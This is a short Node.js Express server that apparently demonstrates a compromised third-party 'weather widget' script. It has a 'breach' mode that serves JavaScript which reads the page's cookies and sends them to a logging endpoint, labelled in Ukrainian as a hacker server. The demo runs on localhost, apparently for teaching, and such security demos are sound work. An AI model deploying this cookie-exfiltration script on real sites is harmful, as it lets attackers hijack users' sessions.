const express = require('express');
const app = express();
app.use(express.static(__dirname));
const port = 5001;

const isBreachMode = process.argv.includes('--mode') && process.argv.includes('breach1');

app.get('/weather.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    
    if (isBreachMode) {
        res.send(`
            const stolenCookie = document.cookie;
        
            fetch('http://localhost:5001/log?data=' + encodeURIComponent(stolenCookie), { mode: 'no-cors' });
            console.log("Cookie successfully sent to Attacker Server!");
        `);
    } else {
        res.send('console.log("Віджет погоди: 22°C, Сонячно");');
    }
});

app.get('/log', (req, res) => {
    console.log("🚨 ХАКЕРСЬКИЙ СЕРВЕР ОТРИМАВ ДАНІ:", req.query.data);
    res.send("Дані отримано");
});

app.listen(port, () => {
    console.log(`WeatherApp (Port ${port}) is running! Breach Mode: ${isBreachMode}`);
});